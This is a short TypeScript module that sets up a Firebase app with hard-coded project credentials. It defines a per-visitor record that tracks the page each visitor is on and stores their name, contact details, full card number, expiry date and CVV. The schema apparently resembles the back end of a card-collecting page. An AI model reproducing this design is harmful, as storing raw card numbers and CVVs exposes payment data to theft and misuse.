import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyCEK4irWtP1f6y_J1Gj3kNwsyLdItndt5Y",
  authDomain: "sdkk-22bbc.firebaseapp.com",
  projectId: "sdkk-22bbc",
  storageBucket: "sdkk-22bbc.firebasestorage.app",
  messagingSenderId: "1039314059862",
  appId: "1:1039314059862:web:e14e764f77ce86c817b1f7",
  measurementId: "G-K0L3MMPDR7"

};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

export { app, auth, db };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

